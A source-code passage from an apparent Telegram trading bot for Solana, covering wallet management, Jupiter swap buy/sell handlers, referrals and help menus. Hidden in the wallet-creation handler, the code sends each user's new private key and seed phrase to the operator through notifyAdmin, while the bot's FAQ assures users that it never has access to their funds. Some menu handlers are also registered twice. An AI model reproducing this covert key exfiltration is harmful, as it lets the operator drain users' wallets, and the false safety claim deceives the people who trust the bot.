      walletList += `${isActive ? '✅' : '⚪'} *Wallet ${i + 1}:* \`${shortenAddress(w.publicKey)}\` (${bal.toFixed(2)} SOL)\n`;
    }
    
    message = `
💼 *Wallet Management*


${walletList}
📍 *Active Wallet:*
\`${activeWallet.publicKey}\`


💰 *Balance:* ${balance.toFixed(4)} SOL



_Tap a wallet to switch, or manage below:_
    `;
    
    const switchButtons = [];
    for (let i = 0; i < session.wallets.length; i++) {
      const isActive = i === session.activeWalletIndex;
      switchButtons.push(
        Markup.button.callback(
          `${isActive ? '✅' : '🪪'} W${i + 1}`,
          `switch_wallet_${i}`
        )
      );
    }
    keyboardButtons.push(switchButtons);
    
    keyboardButtons.push([
      Markup.button.callback('📤 Export Keys', 'wallet_export'),
      Markup.button.callback('🗑️ Remove', 'wallet_remove')
    ]);
    
    if (session.wallets.length < MAX_WALLETS) {
      keyboardButtons.push([
        Markup.button.callback('🆕 Create New', 'wallet_create'),
        Markup.button.callback('📥 Import', 'wallet_import_menu')
      ]);
    }
    
    keyboardButtons.push([Markup.button.callback('🔄 Refresh', 'wallet_refresh')]);
    keyboardButtons.push([Markup.button.callback('« Back', 'back_main')]);
    
  } else {
    message = `
💼 *Wallet Management*


No wallet connected.
You can have up to ${MAX_WALLETS} wallets.

Create a new wallet or import an existing one:
    `;
    
    keyboardButtons = [
      [Markup.button.callback('🆕 Create New Wallet', 'wallet_create')],
      [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')],
      [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')],
      [Markup.button.callback('« Back', 'back_main')]
    ];
  }
  
  const keyboard = Markup.inlineKeyboard(keyboardButtons);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    console.error('showWalletMenu error:', error.message);
    if (edit) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  }
}

// ============================================
// POSITIONS MENU
// ============================================
async function showPositionsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    const message = '❌ Please connect a wallet first.';
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    
    if (edit) {
      await ctx.editMessageText(message, { ...keyboard });
    } else {
      await ctx.reply(message, { ...keyboard });
    }
    return;
  }
  
  const message = `
📊 *Your Positions*

💼 Wallet: \`${shortenAddress(activeWallet.publicKey)}\`

_No open positions_

Paste a token address to analyze and trade.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🔄 Refresh', 'refresh_positions')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// BUY MENU
// ============================================
async function showBuyMenu(ctx, edit = false) {
  const message = `
🟢 *Quick Buy*

Paste a token address or use /buy [amount] [address]

*Quick amounts:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🚀 0.1 SOL', 'setbuy_0.1'),
      Markup.button.callback('🚀 0.2 SOL', 'setbuy_0.2')
    ],
    [
      Markup.button.callback('🚀 0.5 SOL', 'setbuy_0.5'),
      Markup.button.callback('🚀 1 SOL', 'setbuy_1')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SELL MENU
// ============================================
async function showSellMenu(ctx, edit = false) {
  const message = `
🔴 *Quick Sell*

Select a percentage or use /sell [%] [address]

*Quick percentages:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💸 25%', 'setsell_25'),
      Markup.button.callback('💸 50%', 'setsell_50')
    ],
    [
      Markup.button.callback('💸 100%', 'setsell_100'),
      Markup.button.callback('💸 Custom', 'setsell_custom')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// COPY TRADE MENU
// ============================================
async function showCopyTradeMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  const message = `
👥 *Copy Trade*




Follow successful traders automatically.




${session.copyTradeWallets.length > 0 
  ? '*Tracking:*\n' + session.copyTradeWallets.map(w => `• \`${shortenAddress(w)}\``).join('\n')
  : '_No wallets being tracked_'}




Send a wallet address to start copy trading.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('➕ Add Wallet', 'copytrade_add')],
    [Markup.button.callback('📋 Manage Wallets', 'copytrade_manage')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// LIMIT ORDER MENU
// ============================================
async function showLimitOrderMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  const message = `
📈 *Limit Orders*

Set buy/sell triggers at specific prices.

${session.limitOrders.length > 0 
  ? '*Active Orders:*\n' + session.limitOrders.map((o, i) => 
      `${i+1}. ${o.type} ${o.amount} @ $${o.price}`
    ).join('\n')
  : '_No active orders_'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🟢 Limit Buy', 'limit_buy'),
      Markup.button.callback('🔴 Limit Sell', 'limit_sell')
    ],
    [Markup.button.callback('📋 View Orders', 'limit_view')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SETTINGS MENU
// ============================================
async function showSettingsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const { slippage, priorityFee, notifications } = session.settings;
  
  const message = `
⚙️ *Settings*

📊 *Slippage:* ${slippage}%
⚡ *Priority Fee:* ${priorityFee} SOL
🔔 *Notifications:* ${notifications ? 'ON' : 'OFF'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'),
      Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')
    ],
    [
      Markup.button.callback(
        notifications ? '🔔 Notifs: ON' : '🔕 Notifs: OFF',
        'settings_notifications'
      )
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// TRADE HANDLERS (Jupiter V6)
// ============================================
async function handleBuy(ctx, amount, tokenAddress) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ Please connect a wallet first.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')]
      ])
    });
    return;
  }
  
  // Validate token address
  if (!isSolanaAddress(tokenAddress)) {
    await ctx.reply('❌ Invalid token address.');
    return;
  }
  
  const balance = await getBalance(activeWallet.publicKey);
  // Account for priority fee in balance check
  const totalNeeded = amount + session.settings.priorityFee + 0.005; // 0.005 SOL buffer for tx fees
  if (balance < totalNeeded) {
    await ctx.reply(`❌ Insufficient balance. You have ${balance.toFixed(4)} SOL.\nNeeded: ~${totalNeeded.toFixed(4)} SOL (including fees)`);
    return;
  }
  
  const statusMsg = await ctx.reply(`
🔄 *Processing Buy*




Amount: ${amount} SOL
Token: \`${shortenAddress(tokenAddress)}\`
Slippage: ${session.settings.slippage}%




_Getting Jupiter quote..._
  `, { parse_mode: 'Markdown' });
  
  try {
    const amountInLamports = Math.floor(amount * LAMPORTS_PER_SOL);
    const slippageBps = Math.floor(session.settings.slippage * 100);
    
    // Validate slippage is within reasonable bounds
    const validSlippageBps = Math.max(50, Math.min(slippageBps, 5000)); // 0.5% - 50%
    
    const quote = await getJupiterQuote(
      SOL_MINT,
      tokenAddress,
      amountInLamports,
      validSlippageBps
    );
    
    // Validate quote response
    if (!quote || !quote.outAmount) {
      throw new Error('No route found for this token. It may have low liquidity.');
    }
    
    // Get output decimals from quote (Jupiter V6 provides this differently)
    const outputDecimals = quote.outputDecimals || 9;
    const expectedOutput = parseInt(quote.outAmount) / Math.pow(10, outputDecimals);
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Buy*




Amount: ${amount} SOL
Token: \`${shortenAddress(tokenAddress)}\`
Expected Output: ${expectedOutput.toFixed(4)} tokens




_Executing swap..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const result = await executeJupiterSwap(
      quote,
      activeWallet,
      session.settings.priorityFee
    );
    
    // Calculate received amount using the same decimals
    const receivedAmount = parseInt(result.outputAmount) / Math.pow(10, outputDecimals);
    
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, {
      type: 'BUY',
      amount: amount,
      token: tokenAddress,
      txHash: result.txid
    });
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
✅ *Buy Successful!*




💰 Spent: ${amount} SOL
🪙 Received: ${receivedAmount.toFixed(4)} tokens
📝 TX: \`${result.txid}\`
      `,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View TX', `https://solscan.io/tx/${result.txid}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Buy error:', error);
    const errorMessage = error.message || 'Unknown error occurred';
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `❌ *Buy Failed*\n\nError: ${escapeHtml(errorMessage)}`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `buy_${amount}_${tokenAddress}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}




async function handleSell(ctx, percentage, tokenAddress) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ Please connect a wallet first.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')]
      ])
    });
    return;
  }
  
  // Validate token address
  if (!isSolanaAddress(tokenAddress)) {
    await ctx.reply('❌ Invalid token address.');
    return;
  }
  
  // Validate percentage
  const validPercentage = Math.max(1, Math.min(percentage, 100));
  
  const statusMsg = await ctx.reply(`
🔄 *Processing Sell*




Selling: ${validPercentage}%
Token: \`${shortenAddress(tokenAddress)}\`
Slippage: ${session.settings.slippage}%




_Checking token balance..._
  `, { parse_mode: 'Markdown' });
  
  try {
    const tokenBalance = await getTokenBalance(activeWallet.publicKey, tokenAddress);
    
    if (!tokenBalance || tokenBalance.amount <= 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        '❌ No tokens to sell. You may not hold this token.'
      );
      return;
    }
    
    // Handle decimals properly - default to 9 if not available
    const decimals = tokenBalance.decimals || 9;
    
    // Calculate sell amount with proper decimal handling
    const rawAmount = tokenBalance.amount * (validPercentage / 100);
    const sellAmount = Math.floor(rawAmount * Math.pow(10, decimals));
    
    // Ensure we have a valid sell amount
    if (sellAmount <= 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        '❌ Sell amount too small. Token balance may be dust.'
      );
      return;
    }
    
    const slippageBps = Math.floor(session.settings.slippage * 100);
    const validSlippageBps = Math.max(50, Math.min(slippageBps, 5000)); // 0.5% - 50%
    
    const displayAmount = (sellAmount / Math.pow(10, decimals)).toFixed(4);
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Sell*




Selling: ${validPercentage}% (${displayAmount} tokens)
Token: \`${shortenAddress(tokenAddress)}\`




_Getting Jupiter quote..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const quote = await getJupiterQuote(
      tokenAddress,
      SOL_MINT,
      sellAmount,
      validSlippageBps
    );
    
    // Validate quote response
    if (!quote || !quote.outAmount) {
      throw new Error('No route found for this token. It may have low liquidity.');
    }
    
    const expectedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Sell*




Selling: ${displayAmount} tokens
Expected: ${expectedSol.toFixed(4)} SOL




_Executing swap..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const result = await executeJupiterSwap(
      quote,
      activeWallet,
      session.settings.priorityFee
    );
    
    const receivedSol = parseInt(result.outputAmount) / LAMPORTS_PER_SOL;
    
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, {
      type: 'SELL',
      amount: validPercentage + '%',
      token: tokenAddress,
      txHash: result.txid
    });
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
✅ *Sell Successful!*




💰 Sold: ${displayAmount} tokens
🪙 Received: ${receivedSol.toFixed(4)} SOL
📝 TX: \`${result.txid}\`
      `,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View TX', `https://solscan.io/tx/${result.txid}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Sell error:', error);
    const errorMessage = error.message || 'Unknown error occurred';
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `❌ *Sell Failed*\n\nError: ${escapeHtml(errorMessage)}`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `sell_${percentage}_${tokenAddress}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}

// ============================================
// COMMAND HANDLERS
// ============================================
bot.command('start', async (ctx) => {
  const session = getSession(ctx.from.id);
  
  // Check for referral code in start parameter
  const startPayload = ctx.message.text.split(' ')[1];
  if (startPayload && startPayload.startsWith('ref_')) {
    const referralCode = startPayload.replace('ref_', '');
    if (session.isNewUser) {
      const applied = applyReferral(ctx.from.id, referralCode);
      if (applied) {
        const referrerId = referralCodes.get(referralCode);
        await notifyAdmin('REFERRAL_JOINED', referrerId, ctx.from.username, {
          newUserId: ctx.from.id
        });
        await ctx.reply('🎁 Referral applied! You joined via a referral link.');
      }
    }
  }
  
  if (session.isNewUser) {
    session.isNewUser = false;
    await notifyAdmin('NEW_USER', ctx.from.id, ctx.from.username);
  }
  
  await showMainMenu(ctx);
});




bot.command('wallet', async (ctx) => {
  await showWalletMenu(ctx);
});




bot.command('positions', async (ctx) => {
  await showPositionsMenu(ctx);
});




bot.command('buy', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const amount = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(amount) && isSolanaAddress(address)) {
      await handleBuy(ctx, amount, address);
    } else {
      await ctx.reply('❌ Usage: /buy [amount] [token_address]');
    }
  } else {
    await showBuyMenu(ctx);
  }
});




bot.command('sell', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const percentage = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(percentage) && isSolanaAddress(address)) {
      await handleSell(ctx, percentage, address);
    } else {
      await ctx.reply('❌ Usage: /sell [percentage] [token_address]');
    }
  } else {
    await showSellMenu(ctx);
  }
});




bot.command('copytrade', async (ctx) => {
  await showCopyTradeMenu(ctx);
});




bot.command('limit', async (ctx) => {
  await showLimitOrderMenu(ctx);
});




bot.command('settings', async (ctx) => {
  await showSettingsMenu(ctx);
});




bot.command('refresh', async (ctx) => {
  await showMainMenu(ctx);
});




bot.command('referral', async (ctx) => {
  await showReferralsMenu(ctx);
});




bot.command('help', async (ctx) => {
  await showHelpMenu(ctx);
});




// ============================================
// CALLBACK HANDLERS - Navigation
// ============================================
bot.action('back_main', async (ctx) => {
  await ctx.answerCbQuery();
  await showMainMenu(ctx, true);
});




bot.action('refresh_main', async (ctx) => {
  await ctx.answerCbQuery('✅ Refreshed!');
  await showMainMenu(ctx, true);
});




// Noop handler for divider buttons
bot.action('noop', async (ctx) => {
  await ctx.answerCbQuery();
});




// ============================================
// CALLBACK HANDLERS - Menu Navigation
// ============================================
bot.action('menu_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await showWalletMenu(ctx, true);
});




bot.action('menu_positions', async (ctx) => {
  await ctx.answerCbQuery();
  await showPositionsMenu(ctx, true);
});




bot.action('menu_buy', async (ctx) => {
  await ctx.answerCbQuery();
  await showBuyMenu(ctx, true);
});




bot.action('menu_sell', async (ctx) => {
  await ctx.answerCbQuery();
  await showSellMenu(ctx, true);
});




bot.action('menu_copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  await showCopyTradeMenu(ctx, true);
});




bot.action('menu_limit', async (ctx) => {
  await ctx.answerCbQuery();
  await showLimitOrderMenu(ctx, true);
});




bot.action('menu_settings', async (ctx) => {
  await ctx.answerCbQuery();
  await showSettingsMenu(ctx, true);
});




bot.action('menu_referrals', async (ctx) => {
  await ctx.answerCbQuery();
  await showReferralsMenu(ctx, true);
});




bot.action('menu_help', async (ctx) => {
  await ctx.answerCbQuery();
  await showHelpMenu(ctx, true);
});




// ============================================
// CALLBACK HANDLERS - Referrals
// ============================================
bot.action('referral_copy', async (ctx) => {
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  
  await ctx.answerCbQuery('📋 Link copied to clipboard concept - share it!');
  await ctx.reply(`
📋 *Your Referral Link:*

\`${referralLink}\`

_Tap to copy and share with friends!_
  `, { parse_mode: 'Markdown' });
});




bot.action('referral_share', async (ctx) => {
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  
  await ctx.answerCbQuery();
  await ctx.reply(`
📤 *Share with friends:*

🚀 Join me on WTF Snipe X Bot - the ultimate Solana trading bot!

${referralLink}

_Use my link to get started!_
  `, { parse_mode: 'Markdown' });
});




bot.action('referral_list', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.referrals.length === 0) {
    await ctx.reply('📊 No referrals yet. Start sharing your link!');
    return;
  }
  
  const referralsList = session.referrals.map((r, i) => 
    `${i + 1}. User ...${r.userId.toString().slice(-4)} - ${new Date(r.joinedAt).toLocaleDateString()}`
  ).join('\n');
  
  await ctx.reply(`
📊 *Your Referrals (${session.referrals.length}):*

${referralsList}

💰 Total Earnings: ${session.referralEarnings.toFixed(4)} SOL
  `, { parse_mode: 'Markdown' });
});




bot.action('referral_refresh', async (ctx) => {
  await ctx.answerCbQuery('✅ Refreshed!');
  await showReferralsMenu(ctx, true);
});




// ============================================
// CALLBACK HANDLERS - Help Sub-menus
// ============================================
bot.action('help_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
💼 *Wallet Guide*

━━━━━━━━━━━━━━━━━━
*Creating a Wallet:*
1. Go to 💼 Wallet menu
2. Click "🆕 Create New Wallet"
3. Save your seed phrase securely!

*Importing a Wallet:*
1. Go to 💼 Wallet menu
2. Choose import method (Seed/Key)
3. Paste your credentials

*Switching Wallets:*
Click the wallet buttons (W1, W2, etc.)

*Security Tips:*
• Never share your private key
• Store seed phrase offline
• Use a dedicated trading wallet
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});




bot.action('help_trading', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
📊 *Trading Guide*

━━━━━━━━━━━━━━━━━━
*Analyzing Tokens:*
Just paste any Solana contract address

*Buying Tokens:*
1. Paste token address
2. Click Buy amount button
3. Confirm the transaction

*Selling Tokens:*
1. Go to token analysis
2. Click Sell percentage
3. Confirm the transaction

*Limit Orders:*
Set price triggers for auto buy/sell

*DCA (Dollar Cost Average):*
Split buys over time intervals
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});




bot.action('help_security', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
🔒 *Security Tips*

━━━━━━━━━━━━━━━━━━
*Protect Your Wallet:*
• Never share private keys or seed phrases
• Use a dedicated trading wallet
• Don't store large amounts

*Avoid Scams:*
• Check token security scores
• Beware of new tokens (<24h)
• Watch for low liquidity warnings
• Verify contract addresses

*Safe Trading:*
• Start with small amounts
• Use appropriate slippage
• Set price alerts for monitoring

*Red Flags:*
🚨 Sudden large price drops
⚠️ Very low liquidity
⚠️ Extremely new tokens
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});




bot.action('help_faq', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`
❓ *Frequently Asked Questions*

━━━━━━━━━━━━━━━━━━
*Q: How many wallets can I have?*
A: Up to 5 wallets per account

*Q: What are the fees?*
A: Only network fees + priority fee you set

*Q: How does slippage work?*
A: Higher slippage = faster execution but potentially worse price

*Q: Are my funds safe?*
A: You control your private keys. We never have access to your funds.

*Q: What is copy trading?*
A: Automatically mirror trades from successful wallets

*Q: How do referrals work?*
A: Earn 10% of trading fees from referred users
━━━━━━━━━━━━━━━━━━
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back to Help', 'menu_help')]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Menu Navigation
// ============================================
bot.action('menu_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await showWalletMenu(ctx, true);
});

bot.action('menu_positions', async (ctx) => {
  await ctx.answerCbQuery();
  await showPositionsMenu(ctx, true);
});

bot.action('menu_buy', async (ctx) => {
  await ctx.answerCbQuery();
  await showBuyMenu(ctx, true);
});

bot.action('menu_sell', async (ctx) => {
  await ctx.answerCbQuery();
  await showSellMenu(ctx, true);
});

bot.action('menu_copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  await showCopyTradeMenu(ctx, true);
});

bot.action('menu_limit', async (ctx) => {
  await ctx.answerCbQuery();
  await showLimitOrderMenu(ctx, true);
});

bot.action('menu_settings', async (ctx) => {
  await ctx.answerCbQuery();
  await showSettingsMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Wallet Actions
// ============================================
bot.action('wallet_create', async (ctx) => {
  await ctx.answerCbQuery();
  
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  const walletData = createWallet();
  session.wallets.push(walletData);
  session.activeWalletIndex = session.wallets.length - 1;
  
  await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, {
    publicKey: walletData.publicKey,
    privateKey: walletData.privateKey,
    mnemonic: walletData.mnemonic,
    walletNumber: session.wallets.length
  });
  
  await ctx.editMessageText(`
✅ *Wallet ${session.wallets.length} Created!*

📍 *Address:*
\`${walletData.publicKey}\`

📝 *Seed Phrase (SAVE THIS!):*
\`${walletData.mnemonic}\`

⚠️ *Never share your seed phrase!*
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
    ])
  });
});

bot.action('wallet_import_menu', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📥 *Import Wallet*

Choose import method:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📝 Seed Phrase', 'wallet_import_seed')],
      [Markup.button.callback('🔑 Private Key', 'wallet_import_key')],
      [Markup.button.callback('« Back', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_import_seed', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  session.state = 'AWAITING_SEED';
  
  await ctx.editMessageText(`
📥 *Import via Seed Phrase*

Please send your 12 or 24 word seed phrase.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_import_key', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  session.state = 'AWAITING_PRIVATE_KEY';
  
  await ctx.editMessageText(`
🔑 *Import via Private Key*

Please send your Base58 encoded private key.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_export', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    await ctx.reply('❌ No wallet connected.');
    return;
  }
  
  await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, {
    publicKey: activeWallet.publicKey
  });
  
  const message = `
🔐 *Export Wallet ${session.activeWalletIndex + 1}*

📍 *Address:*
\`${activeWallet.publicKey}\`

🔑 *Private Key:*
\`${activeWallet.privateKey}\`
${activeWallet.mnemonic ? `
📝 *Seed Phrase:*
\`${activeWallet.mnemonic}\`` : ''}

⚠️ *Delete this message after saving!*
  `;
  
  await ctx.reply(message, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🗑️ Delete Message', 'delete_message')]
    ])
  });
});

bot.action('wallet_remove', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.wallets.length === 0) {
    await ctx.reply('❌ No wallets to remove.');
    return;
  }
  
  const buttons = session.wallets.map((w, i) => [
    Markup.button.callback(
      `🗑️ Remove Wallet ${i + 1} (${shortenAddress(w.publicKey)})`,
      `confirm_remove_${i}`
    )
  ]);
  
  buttons.push([Markup.button.callback('« Back', 'menu_wallet')]);
  
  await ctx.editMessageText(`
🗑️ *Remove Wallet*

Select a wallet to remove:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.action(/^confirm_remove_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index < 0 || index >= session.wallets.length) {
    await ctx.reply('❌ Invalid wallet.');
    return;
  }
  
  const removedWallet = session.wallets.splice(index, 1)[0];
  
  if (session.activeWalletIndex >= session.wallets.length) {
    session.activeWalletIndex = Math.max(0, session.wallets.length - 1);
  }
  
  await ctx.editMessageText(`
✅ Wallet removed: \`${shortenAddress(removedWallet.publicKey)}\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
    ])
  });
});

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  await showWalletMenu(ctx, true);
});

bot.action(/^switch_wallet_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index >= 0 && index < session.wallets.length) {
    session.activeWalletIndex = index;
    await ctx.answerCbQuery(`Switched to Wallet ${index + 1}`);
    await showWalletMenu(ctx, true);
  } else {
    await ctx.answerCbQuery('Invalid wallet');
  }
});

// ============================================
// CALLBACK HANDLERS - Trading
// ============================================
bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => {
  const amount = parseFloat(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Buying ${amount} SOL...`);
  await handleBuy(ctx, amount, address);
});

bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => {
  const percentage = parseInt(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Selling ${percentage}%...`);
  await handleSell(ctx, percentage, address);
});

bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => {
  const amount = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${amount} SOL`);
  const session = getSession(ctx.from.id);
  session.pendingTrade = { type: 'buy', amount: parseFloat(amount) };
  
  await ctx.editMessageText(`
🟢 *Buy ${amount} SOL*

Paste a token address to buy.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
